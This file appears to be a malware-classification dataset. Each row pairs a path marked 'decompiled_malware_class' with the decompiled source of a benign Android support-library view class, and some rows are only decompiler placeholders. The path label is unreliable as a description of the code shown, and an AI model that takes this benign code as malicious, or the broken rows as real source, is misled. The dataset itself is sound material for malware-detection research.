sendAccessibilityEventUnchecked(      View host,      AccessibilityEvent event){         AccessibilityDelegateBridgeJellyBean.this.sendAccessibilityEventUnchecked(host,event);       }       @Override public AccessibilityNodeProvider getAccessibilityNodeProvider(      View host){         return (AccessibilityNodeProvider)AccessibilityDelegateBridgeJellyBean.this.getAccessibilityNodeProvider(host);       }       @Override public boolean performAccessibilityAction(      View host,      int action,      Bundle args){         return AccessibilityDelegateBridgeJellyBean.this.performAccessibilityAction(host,action,args);       }     } ;   }   public static Object getAccessibilityNodeProvider(  Object delegate,  View host){     return ((View.AccessibilityDelegate)delegate).getAccessibilityNodeProvider(host);   }   public static boolean performAccessibilityAction(  Object delegate,  View host,  int action,  Bundle args){     return ((View.AccessibilityDelegate)delegate).performAccessibilityAction(host,action,args);   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.view\AccessibilityDelegateIcsImpl.code","static class AccessibilityDelegateIcsImpl extends AccessibilityDelegateStubImpl {   AccessibilityDelegateIcsImpl(){   }   @Override public Object newAccessiblityDelegateDefaultImpl(){     return AccessibilityDelegateCompatIcs.newAccessibilityDelegateDefaultImpl();   }   @Override public Object newAccessiblityDelegateBridge(  final AccessibilityDelegateCompat compat){     return AccessibilityDelegateCompatIcs.newAccessibilityDelegateBridge(new AccessibilityDelegateCompatIcs.AccessibilityDelegateBridge(){       @Override public boolean dispatchPopulateAccessibilityEvent(      View host,      AccessibilityEvent event){         return compat.dispatchPopulateAccessibilityEvent(host,event);       }       @Override public void onInitializeAccessibilityEvent(      View host,      AccessibilityEvent event){         compat.onInitializeAccessibilityEvent(host,event);       }       @Override public void onInitializeAccessibilityNodeInfo(      View host,      Object info){         compat.onInitializeAccessibilityNodeInfo(host,new AccessibilityNodeInfoCompat(info));       }       @Override public void onPopulateAccessibilityEvent(      View host,      AccessibilityEvent event){         compat.onPopulateAccessibilityEvent(host,event);       }       @Override public boolean onRequestSendAccessibilityEvent(      ViewGroup host,      View child,      AccessibilityEvent event){         return compat.onRequestSendAccessibilityEvent(host,child,event);       }       @Override public void sendAccessibilityEvent(      View host,      int eventType){         compat.sendAccessibilityEvent(host,eventType);       }       @Override public void sendAccessibilityEventUnchecked(      View host,      AccessibilityEvent event){         compat.sendAccessibilityEventUnchecked(host,event);       }     } );   }   @Override public boolean dispatchPopulateAccessibilityEvent(  Object delegate,  View host,  AccessibilityEvent event){     return AccessibilityDelegateCompatIcs.dispatchPopulateAccessibilityEvent(delegate,host,event);   }   @Override public void onInitializeAccessibilityEvent(  Object delegate,  View host,  AccessibilityEvent event){     AccessibilityDelegateCompatIcs.onInitializeAccessibilityEvent(delegate,host,event);   }   @Override public void onInitializeAccessibilityNodeInfo(  Object delegate,  View host,  AccessibilityNodeInfoCompat info){     AccessibilityDelegateCompatIcs.onInitializeAccessibilityNodeInfo(delegate,host,info.getInfo());   }   @Override public void onPopulateAccessibilityEvent(  Object delegate,  View host,  AccessibilityEvent event){     AccessibilityDelegateCompatIcs.onPopulateAccessibilityEvent(delegate,host,event);   }   @Override public boolean onRequestSendAccessibilityEvent(  Object delegate,  ViewGroup host,  View child,  AccessibilityEvent event){     return AccessibilityDelegateCompatIcs.onRequestSendAccessibilityEvent(delegate,host,child,event);   }   @Override public void sendAccessibilityEvent(  Object delegate,  View host,  int eventType){     AccessibilityDelegateCompatIcs.sendAccessibilityEvent(delegate,host,eventType);   }   @Override public void sendAccessibilityEventUnchecked(  Object delegate,  View host,  AccessibilityEvent event){     AccessibilityDelegateCompatIcs.sendAccessibilityEventUnchecked(delegate,host,event);   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.view\AccessibilityDelegateImpl.code","public interface AccessibilityDelegateImpl {   boolean dispatchPopulateAccessibilityEvent(  Object obj,  View view,  AccessibilityEvent accessibilityEvent);   AccessibilityNodeProviderCompat getAccessibilityNodeProvider(  Object obj,  View view);   Object newAccessiblityDelegateBridge(  AccessibilityDelegateCompat accessibilityDelegateCompat);   Object newAccessiblityDelegateDefaultImpl();   void onInitializeAccessibilityEvent(  Object obj,  View view,  AccessibilityEvent accessibilityEvent);   void onInitializeAccessibilityNodeInfo(  Object obj,  View view,  AccessibilityNodeInfoCompat accessibilityNodeInfoCompat);   void onPopulateAccessibilityEvent(  Object obj,  View view,  AccessibilityEvent accessibilityEvent);   boolean onRequestSendAccessibilityEvent(  Object obj,  ViewGroup viewGroup,  View view,  AccessibilityEvent accessibilityEvent);   boolean performAccessibilityAction(  Object obj,  View view,  int i,  Bundle bundle);   void sendAccessibilityEvent(  Object obj,  View view,  int i);   void sendAccessibilityEventUnchecked(  Object obj,  View view,  AccessibilityEvent accessibilityEvent); } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.view\AccessibilityDelegateJellyBeanImpl.code","static class AccessibilityDelegateJellyBeanImpl extends AccessibilityDelegateIcsImpl {   AccessibilityDelegateJellyBeanImpl(){   }   @Override public Object newAccessiblityDelegateBridge(  final AccessibilityDelegateCompat compat){     return AccessibilityDelegateCompatJellyBean.newAccessibilityDelegateBridge(new AccessibilityDelegateCompatJellyBean.AccessibilityDelegateBridgeJellyBean(){       @Override public boolean dispatchPopulateAccessibilityEvent(      View host,      AccessibilityEvent event){         return compat.dispatchPopulateAccessibilityEvent(host,event);       }       @Override public void onInitializeAccessibilityEvent(      View host,      AccessibilityEvent event){         compat.onInitializeAccessibilityEvent(host,event);       }       @Override public void onInitializeAccessibilityNodeInfo(      View host,      Object info){         compat.onInitializeAccessibilityNodeInfo(host,new AccessibilityNodeInfoCompat(info));       }       @Override public void onPopulateAccessibilityEvent(      View host,      AccessibilityEvent event){         compat.onPopulateAccessibilityEvent(host,event);       }       @Override public boolean onRequestSendAccessibilityEvent(      ViewGroup host,      View child,      AccessibilityEvent event){         return compat.onRequestSendAccessibilityEvent(host,child,event);       }       @Override public void sendAccessibilityEvent(      View host,      int eventType){         compat.sendAccessibilityEvent(host,eventType);       }       @Override public void sendAccessibilityEventUnchecked(      View host,      AccessibilityEvent event){         compat.sendAccessibilityEventUnchecked(host,event);       }       @Override public Object getAccessibilityNodeProvider(      View host){         AccessibilityNodeProviderCompat provider=compat.getAccessibilityNodeProvider(host);         if (provider != null) {           return provider.getProvider();         }         return null;       }       @Override public boolean performAccessibilityAction(      View host,      int action,      Bundle args){         return compat.performAccessibilityAction(host,action,args);       }     } );   }   @Override public AccessibilityNodeProviderCompat getAccessibilityNodeProvider(  Object delegate,  View host){     Object provider=AccessibilityDelegateCompatJellyBean.getAccessibilityNodeProvider(delegate,host);     if (provider != null) {       return new AccessibilityNodeProviderCompat(provider);     }     return null;   }   @Override public boolean performAccessibilityAction(  Object delegate,  View host,  int action,  Bundle args){     return AccessibilityDelegateCompatJellyBean.performAccessibilityAction(delegate,host,action,args);   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.view\AccessibilityDelegateStubImpl.code","static class AccessibilityDelegateStubImpl implements AccessibilityDelegateImpl {   AccessibilityDelegateStubImpl(){   }   @Override public Object newAccessiblityDelegateDefaultImpl(){     return null;   }   @Override public Object newAccessiblityDelegateBridge(  AccessibilityDelegateCompat listener){     return null;   }   @Override public boolean dispatchPopulateAccessibilityEvent(  Object delegate,  View host,  AccessibilityEvent event){     return false;   }   @Override public void onInitializeAccessibilityEvent(  Object delegate,  View host,  AccessibilityEvent event){   }   @Override public void onInitializeAccessibilityNodeInfo(  Object delegate,  View host,  AccessibilityNodeInfoCompat info){   }   @Override public void onPopulateAccessibilityEvent(  Object delegate,  View host,  AccessibilityEvent event){   }   @Override public boolean onRequestSendAccessibilityEvent(  Object delegate,  ViewGroup host,  View child,  AccessibilityEvent event){     return true;   }   @Override public void sendAccessibilityEvent(  Object delegate,  View host,  int eventType){   }   @Override public void sendAccessibilityEventUnchecked(  Object delegate,  View host,  AccessibilityEvent event){   }   @Override public AccessibilityNodeProviderCompat getAccessibilityNodeProvider(  Object delegate,  View host){     return null;   }   @Override public boolean performAccessibilityAction(  Object delegate,  View host,  int action,  Bundle args){     return false;   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.view\ActionProvider.code","public abstract class ActionProvider {   private static final String TAG=""ActionProvider(support)"";   private final Context mContext;   private SubUiVisibilityListener mSubUiVisibilityListener;   private VisibilityListener mVisibilityListener; public interface SubUiVisibilityListener {     void onSubUiVisibilityChanged(    boolean z);   } public interface VisibilityListener {     void onActionProviderVisibilityChanged(    boolean z);   }   public abstract View onCreateActionView();   public ActionProvider(  Context context){     this.mContext=context;   }   public Context getContext(){     return this.mContext;   }   public View onCreateActionView(  MenuItem forItem){     return onCreateActionView();   }   public boolean overridesItemVisibility(){     return false;   }   public boolean isVisible(){     return true;   }   public void refreshVisibility(){     if (this.mVisibilityListener != null && overridesItemVisibility()) {       this.mVisibilityListener.onActionProviderVisibilityChanged(isVisible());     }   }   public boolean onPerformDefaultAction(){     return false;   }   public boolean hasSubMenu(){     return false;   }   public void onPrepareSubMenu(  SubMenu subMenu){   }   public void subUiVisibilityChanged(  boolean isVisible){     if (this.mSubUiVisibilityListener != null) {       this.mSubUiVisibilityListener.onSubUiVisibilityChanged(isVisible);     }   }   public void setSubUiVisibilityListener(  SubUiVisibilityListener listener){     this.mSubUiVisibilityListener=listener;   }   public void setVisibilityListener(  VisibilityListener listener){     if (this.mVisibilityListener != null && listener != null) {       Log.w(TAG,""setVisibilityListener: Setting a new ActionProvider.VisibilityListener when one is already set. Are you reusing this "" + getClass().getSimpleName() + "" instance while it is still in use somewhere else?"");     }     this.mVisibilityListener=listener;   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.view\BaseKeyEventVersionImpl.code","static class BaseKeyEventVersionImpl implements KeyEventVersionImpl {   private static final int META_ALL_MASK=247;   private static final int META_MODIFIER_MASK=247;   BaseKeyEventVersionImpl(){   }   private static int metaStateFilterDirectionalModifiers(  int metaState,  int modifiers,  int basic,  int left,  int right){     boolean wantBasic=(modifiers & basic) != 0;     int directional=left | right;     boolean wantLeftOrRight=(modifiers & directional) != 0;     if (wantBasic) {       if (wantLeftOrRight) {         throw new IllegalArgumentException(""bad arguments"");       }       return metaState & (directional ^ (-1));     }     if (wantLeftOrRight) {       return metaState & (basic ^ (-1));     }     return metaState;   }   @Override public int normalizeMetaState(  int metaState){     if ((metaState & 192) != 0) {       metaState|=1;     }     if ((metaState & 48) != 0) {       metaState|=2;     }     return metaState & 247;   }   @Override public boolean metaStateHasModifiers(  int metaState,  int modifiers){     return metaStateFilterDirectionalModifiers(metaStateFilterDirectionalModifiers(normalizeMetaState(metaState) & 247,modifiers,1,64,128),modifiers,2,16,32) == modifiers;   }   @Override public boolean metaStateHasNoModifiers(  int metaState){     return (normalizeMetaState(metaState) & 247) == 0;   }   @Override public void startTracking(  KeyEvent event){   }   @Override public boolean isTracking(  KeyEvent event){     return false;   }   @Override public Object getKeyDispatcherState(  View view){     return null;   }   @Override public boolean dispatch(  KeyEvent event,  KeyEvent.Callback receiver,  Object state,  Object target){     return event.dispatch(receiver);   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.view\BaseMenuVersionImpl.code","static class BaseMenuVersionImpl implements MenuVersionImpl {   BaseMenuVersionImpl(){   }   @Override public void setShowAsAction(  MenuItem item,  int actionEnum){   }   @Override public MenuItem setActionView(  MenuItem item,  View view){     return item;   }   @Override public MenuItem setActionView(  MenuItem item,  int resId){     return item;   }   @Override public View getActionView(  MenuItem item){     return null;   }   @Override public boolean expandActionView(  MenuItem item){     return false;   }   @Override public boolean collapseActionView(  MenuItem item){     return false;   }   @Override public boolean isActionViewExpanded(  MenuItem item){     return false;   }   @Override public MenuItem setOnActionExpandListener(  MenuItem item,  OnActionExpandListener listener){     return item;   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.view\BaseMotionEventVersionImpl.code","static class BaseMotionEventVersionImpl implements MotionEventVersionImpl {   BaseMotionEventVersionImpl(){   }   @Override public int findPointerIndex(  MotionEvent event,  int pointerId){     return pointerId == 0 ? 0 : -1;   }   @Override public int getPointerId(  MotionEvent event,  int pointerIndex){     if (pointerIndex == 0) {       return 0;     }     throw new IndexOutOfBoundsException(""Pre-Eclair does not support multiple pointers"");   }   @Override public float getX(  MotionEvent event,  int pointerIndex){     if (pointerIndex == 0) {       return event.getX();     }     throw new IndexOutOfBoundsException(""Pre-Eclair does not support multiple pointers"");   }   @Override public float getY(  MotionEvent event,  int pointerIndex){     if (pointerIndex == 0) {       return event.getY();     }     throw new IndexOutOfBoundsException(""Pre-Eclair does not support multiple pointers"");   }   @Override public int getPointerCount(  MotionEvent event){     return 1;   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.view\BaseScaleGestureDetectorImpl.code","private static class BaseScaleGestureDetectorImpl implements ScaleGestureDetectorImpl {   private BaseScaleGestureDetectorImpl(){   }   @Override public void setQuickScaleEnabled(  Object o,  boolean enabled){   }   @Override public boolean isQuickScaleEnabled(  Object o){     return false;   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.view\BaseVelocityTrackerVersionImpl.code","static class BaseVelocityTrackerVersionImpl implements VelocityTrackerVersionImpl {   BaseVelocityTrackerVersionImpl(){   }   @Override public float getXVelocity(  VelocityTracker tracker,  int pointerId){     return tracker.getXVelocity();   }   @Override public float getYVelocity(  VelocityTracker tracker,  int pointerId){     return tracker.getYVelocity();   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.view\BaseViewCompatImpl.code","static class BaseViewCompatImpl implements ViewCompatImpl {   BaseViewCompatImpl(){   }   @Override public boolean canScrollHorizontally(  View v,  int direction){     return false;   }   @Override public boolean canScrollVertically(  View v,  int direction){     return false;   }   @Override public int getOverScrollMode(  View v){     return 2;   }   @Override public void setOverScrollMode(  View v,  int mode){   }   @Override public void setAccessibilityDelegate(  View v,  AccessibilityDelegateCompat delegate){   }   @Override public void onPopulateAccessibilityEvent(  View v,  AccessibilityEvent event){   }   @Override public void onInitializeAccessibilityEvent(  View v,  AccessibilityEvent event){   }   @Override public void onInitializeAccessibilityNodeInfo(  View v,  AccessibilityNodeInfoCompat info){   }   @Override public boolean hasTransientState(  View view){     return false;   }   @Override public void setHasTransientState(  View view,  boolean hasTransientState){   }   @Override public void postInvalidateOnAnimation(  View view){     view.postInvalidateDelayed(getFrameTime());   }   @Override public void postInvalidateOnAnimation(  View view,  int left,  int top,  int right,  int bottom){     view.postInvalidateDelayed(getFrameTime(),left,top,right,bottom);   }   @Override public void postOnAnimation(  View view,  Runnable action){     view.postDelayed(action,getFrameTime());   }   @Override public void postOnAnimationDelayed(  View view,  Runnable action,  long delayMillis){     view.postDelayed(action,getFrameTime() + delayMillis);   }   long getFrameTime(){     return ViewCompat.FAKE_FRAME_TIME;   }   @Override public int getImportantForAccessibility(  View view){     return 0;   }   @Override public void setImportantForAccessibility(  View view,  int mode){   }   @Override public boolean performAccessibilityAction(  View view,  int action,  Bundle arguments){     return false;   }   @Override public AccessibilityNodeProviderCompat getAccessibilityNodeProvider(  View view){     return null;   }   @Override public float getAlpha(  View view){     return 1.0f;   }   @Override public void setLayerType(  View view,  int layerType,  Paint paint){   }   @Override public int getLayerType(  View view){     return 0;   }   @Override public int getLabelFor(  View view){     return 0;   }   @Override public void setLabelFor(  View view,  int id){   }   @Override public void setLayerPaint(  View view,  Paint p){   }   @Override public int getLayoutDirection(  View view){     return 0;   }   @Override public void setLayoutDirection(  View view,  int layoutDirection){   }   @Override public ViewParent getParentForAccessibility(  View view){     return view.getParent();   }   @Override public boolean isOpaque(  View view){     Drawable bg=view.getBackground();     return bg != null && bg.getOpacity() == -1;   }   @Override public int resolveSizeAndState(  int size,  int measureSpec,  int childMeasuredState){     return View.resolveSize(size,measureSpec);   }   @Override public int getMeasuredWidthAndState(  View view){     return view.getMeasuredWidth();   }   @Override public int getMeasuredHeightAndState(  View view){     return view.getMeasuredHeight();   }   @Override public int getMeasuredState(  View view){     return 0;   }   @Override public int getAccessibilityLiveRegion(  View view){     return 0;   }   @Override public void setAccessibilityLiveRegion(  View view,  int mode){   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.view\BaseViewConfigurationVersionImpl.code","static class BaseViewConfigurationVersionImpl implements ViewConfigurationVersionImpl {   BaseViewConfigurationVersionImpl(){   }   @Override public int getScaledPagingTouchSlop(  ViewConfiguration config){     return config.getScaledTouchSlop();   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.view\Decor.code","interface Decor { } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.view\EclairKeyEventVersionImpl.code","static class EclairKeyEventVersionImpl extends BaseKeyEventVersionImpl {   EclairKeyEventVersionImpl(){   }   @Override public void startTracking(  KeyEvent event){     KeyEventCompatEclair.startTracking(event);   }   @Override public boolean isTracking(  KeyEvent event){     return KeyEventCompatEclair.isTracking(event);   }   @Override public Object getKeyDispatcherState(  View view){     return KeyEventCompatEclair.getKeyDispatcherState(view);   }   @Override public boolean dispatch(  KeyEvent event,  KeyEvent.Callback receiver,  Object state,  Object target){     return KeyEventCompatEclair.dispatch(event,receiver,state,target);   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.view\EclairMotionEventVersionImpl.code","static class EclairMotionEventVersionImpl implements MotionEventVersionImpl {   EclairMotionEventVersionImpl(){   }   @Override public int findPointerIndex(  MotionEvent event,  int pointerId){     return MotionEventCompatEclair.findPointerIndex(event,pointerId);   }   @Override public int getPointerId(  MotionEvent event,  int pointerIndex){     return MotionEventCompatEclair.getPointerId(event,pointerIndex);   }   @Override public float getX(  MotionEvent event,  int pointerIndex){     return MotionEventCompatEclair.getX(event,pointerIndex);   }   @Override public float getY(  MotionEvent event,  int pointerIndex){     return MotionEventCompatEclair.getY(event,pointerIndex);   }   @Override public int getPointerCount(  MotionEvent event){     return MotionEventCompatEclair.getPointerCount(event);   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.view\EclairMr1ViewCompatImpl.code","static class EclairMr1ViewCompatImpl extends BaseViewCompatImpl {   EclairMr1ViewCompatImpl(){   }   @Override public boolean isOpaque(  View view){     return ViewCompatEclairMr1.isOpaque(view);   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.view\FroyoViewConfigurationVersionImpl.code","static class FroyoViewConfigurationVersionImpl implements ViewConfigurationVersionImpl {   FroyoViewConfigurationVersionImpl(){   }   @Override public int getScaledPagingTouchSlop(  ViewConfiguration config){     return ViewConfigurationCompatFroyo.getScaledPagingTouchSlop(config);   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.view\GBViewCompatImpl.code","static class GBViewCompatImpl extends EclairMr1ViewCompatImpl {   GBViewCompatImpl(){   }   @Override public int getOverScrollMode(  View v){     return ViewCompatGingerbread.getOverScrollMode(v);   }   @Override public void setOverScrollMode(  View v,  int mode){     ViewCompatGingerbread.setOverScrollMode(v,mode);   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.view\GestureDetectorCompat.code","!org.eclipse.jdt.core.dom.TypeDeclaration@2dc52cbe"
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.view\GestureDetectorCompatImpl.code","interface GestureDetectorCompatImpl {   boolean isLongpressEnabled();   boolean onTouchEvent(  MotionEvent motionEvent);   void setIsLongpressEnabled(  boolean z);   void setOnDoubleTapListener(  GestureDetector.OnDoubleTapListener onDoubleTapListener); } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.view\GestureDetectorCompatImplBase.code","!org.eclipse.jdt.core.dom.TypeDeclaration@77fcc6ae"
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.view\GestureDetectorCompatImplJellybeanMr2.code","static class GestureDetectorCompatImplJellybeanMr2 implements GestureDetectorCompatImpl {   private final GestureDetector mDetector;   public GestureDetectorCompatImplJellybeanMr2(  Context context,  GestureDetector.OnGestureListener listener,  Handler handler){     this.mDetector=new GestureDetector(context,listener,handler);   }   @Override public boolean isLongpressEnabled(){     return this.mDetector.isLongpressEnabled();   }   @Override public boolean onTouchEvent(  MotionEvent ev){     return this.mDetector.onTouchEvent(ev);   }   @Override public void setIsLongpressEnabled(  boolean enabled){     this.mDetector.setIsLongpressEnabled(enabled);   }   @Override public void setOnDoubleTapListener(  GestureDetector.OnDoubleTapListener listener){     this.mDetector.setOnDoubleTapListener(listener);   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.view\GestureHandler.code","!org.eclipse.jdt.core.dom.TypeDeclaration@55ef36c3"
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.view\GravityCompat.code","public class GravityCompat {   public static final int END=8388613;   static final GravityCompatImpl IMPL;   public static final int RELATIVE_HORIZONTAL_GRAVITY_MASK=8388615;   public static final int RELATIVE_LAYOUT_DIRECTION=8388608;   public static final int START=8388611; interface GravityCompatImpl {     void apply(    int i,    int i2,    int i3,    Rect rect,    int i4,    int i5,    Rect rect2,    int i6);     void apply(    int i,    int i2,    int i3,    Rect rect,    Rect rect2,    int i4);     void applyDisplay(    int i,    Rect rect,    Rect rect2,    int i2);     int getAbsoluteGravity(    int i,    int i2);   } static class GravityCompatImplBase implements GravityCompatImpl {     GravityCompatImplBase(){     }     @Override public int getAbsoluteGravity(    int gravity,    int layoutDirection){       return (-8388609) & gravity;     }     @Override public void apply(    int gravity,    int w,    int h,    Rect container,    Rect outRect,    int layoutDirection){       Gravity.apply(gravity,w,h,container,outRect);     }     @Override public void apply(    int gravity,    int w,    int h,    Rect container,    int xAdj,    int yAdj,    Rect outRect,    int layoutDirection){       Gravity.apply(gravity,w,h,container,xAdj,yAdj,outRect);     }     @Override public void applyDisplay(    int gravity,    Rect display,    Rect inoutObj,    int layoutDirection){       Gravity.applyDisplay(gravity,display,inoutObj);     }   } static class GravityCompatImplJellybeanMr1 implements GravityCompatImpl {     GravityCompatImplJellybeanMr1(){     }     @Override public int getAbsoluteGravity(    int gravity,    int layoutDirection){       return GravityCompatJellybeanMr1.getAbsoluteGravity(gravity,layoutDirection);     }     @Override public void apply(    int gravity,    int w,    int h,    Rect container,    Rect outRect,    int layoutDirection){       GravityCompatJellybeanMr1.apply(gravity,w,h,container,outRect,layoutDirection);     }     @Override public void apply(    int gravity,    int w,    int h,    Rect container,    int xAdj,    int yAdj,    Rect outRect,    int layoutDirection){       GravityCompatJellybeanMr1.apply(gravity,w,h,container,xAdj,yAdj,outRect,layoutDirection);     }     @Override public void applyDisplay(    int gravity,    Rect display,    Rect inoutObj,    int layoutDirection){       GravityCompatJellybeanMr1.applyDisplay(gravity,display,inoutObj,layoutDirection);     }   } static {     int version=Build.VERSION.SDK_INT;     if (version >= 17) {       IMPL=new GravityCompatImplJellybeanMr1();     }  else {       IMPL=new GravityCompatImplBase();     }   }   public static void apply(  int gravity,  int w,  int h,  Rect container,  Rect outRect,  int layoutDirection){     IMPL.apply(gravity,w,h,container,outRect,layoutDirection);   }   public static void apply(  int gravity,  int w,  int h,  Rect container,  int xAdj,  int yAdj,  Rect outRect,  int layoutDirection){     IMPL.apply(gravity,w,h,container,xAdj,yAdj,outRect,layoutDirection);   }   public static void applyDisplay(  int gravity,  Rect display,  Rect inoutObj,  int layoutDirection){     IMPL.applyDisplay(gravity,display,inoutObj,layoutDirection);   }   public static int getAbsoluteGravity(  int gravity,  int layoutDirection){     return IMPL.getAbsoluteGravity(gravity,layoutDirection);   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.view\GravityCompatImpl.code","interface GravityCompatImpl {   void apply(  int i,  int i2,  int i3,  Rect rect,  int i4,  int i5,  Rect rect2,  int i6);   void apply(  int i,  int i2,  int i3,  Rect rect,  Rect rect2,  int i4);   void applyDisplay(  int i,  Rect rect,  Rect rect2,  int i2);   int getAbsoluteGravity(  int i,  int i2); } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.view\GravityCompatImplBase.code","static class GravityCompatImplBase implements GravityCompatImpl {   GravityCompatImplBase(){   }   @Override public int getAbsoluteGravity(  int gravity,  int layoutDirection){     return (-8388609) & gravity;   }   @Override public void apply(  int gravity,  int w,  int h,  Rect container,  Rect outRect,  int layoutDirection){     Gravity.apply(gravity,w,h,container,outRect);   }   @Override public void apply(  int gravity,  int w,  int h,  Rect container,  int xAdj,  int yAdj,  Rect outRect,  int layoutDirection){     Gravity.apply(gravity,w,h,container,xAdj,yAdj,outRect);   }   @Override public void applyDisplay(  int gravity,  Rect display,  Rect inoutObj,  int layoutDirection){     Gravity.applyDisplay(gravity,display,inoutObj);   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.view\GravityCompatImplJellybeanMr1.code","static class GravityCompatImplJellybeanMr1 implements GravityCompatImpl {   GravityCompatImplJellybeanMr1(){   }   @Override public int getAbsoluteGravity(  int gravity,  int layoutDirection){     return GravityCompatJellybeanMr1.getAbsoluteGravity(gravity,layoutDirection);   }   @Override public void apply(  int gravity,  int w,  int h,  Rect container,  Rect outRect,  int layoutDirection){     GravityCompatJellybeanMr1.apply(gravity,w,h,container,outRect,layoutDirection);   }   @Override public void apply(  int gravity,  int w,  int h,  Rect container,  int xAdj,  int yAdj,  Rect outRect,  int layoutDirection){     GravityCompatJellybeanMr1.apply(gravity,w,h,container,xAdj,yAdj,outRect,layoutDirection);   }   @Override public void applyDisplay(  int gravity,  Rect display,  Rect inoutObj,  int layoutDirection){     GravityCompatJellybeanMr1.applyDisplay(gravity,display,inoutObj,layoutDirection);   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.view\GravityCompatJellybeanMr1.code","class GravityCompatJellybeanMr1 {   GravityCompatJellybeanMr1(){   }   public static int getAbsoluteGravity(  int gravity,  int layoutDirection){     return Gravity.getAbsoluteGravity(gravity,layoutDirection);   }   public static void apply(  int gravity,  int w,  int h,  Rect container,  Rect outRect,  int layoutDirection){     Gravity.apply(gravity,w,h,container,outRect,layoutDirection);   }   public static void apply(  int gravity,  int w,  int h,  Rect container,  int xAdj,  int yAdj,  Rect outRect,  int layoutDirection){     Gravity.apply(gravity,w,h,container,xAdj,yAdj,outRect,layoutDirection);   }   public static void applyDisplay(  int gravity,  Rect display,  Rect inoutObj,  int layoutDirection){     Gravity.applyDisplay(gravity,display,inoutObj,layoutDirection);   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.view\HCViewCompatImpl.code","static class HCViewCompatImpl extends GBViewCompatImpl {   HCViewCompatImpl(){   }   @Override long getFrameTime(){     return ViewCompatHC.getFrameTime();   }   @Override public float getAlpha(  View view){     return ViewCompatHC.getAlpha(view);   }   @Override public void setLayerType(  View view,  int layerType,  Paint paint){     ViewCompatHC.setLayerType(view,layerType,paint);   }   @Override public int getLayerType(  View view){     return ViewCompatHC.getLayerType(view);   }   @Override public void setLayerPaint(  View view,  Paint paint){     setLayerType(view,getLayerType(view),paint);     view.invalidate();   }   @Override public int resolveSizeAndState(  int size,  int measureSpec,  int childMeasuredState){     return ViewCompatHC.resolveSizeAndState(size,measureSpec,childMeasuredState);   }   @Override public int getMeasuredWidthAndState(  View view){     return ViewCompatHC.getMeasuredWidthAndState(view);   }   @Override public int getMeasuredHeightAndState(  View view){     return ViewCompatHC.getMeasuredHeightAndState(view);   }   @Override public int getMeasuredState(  View view){     return ViewCompatHC.getMeasuredState(view);   } } "
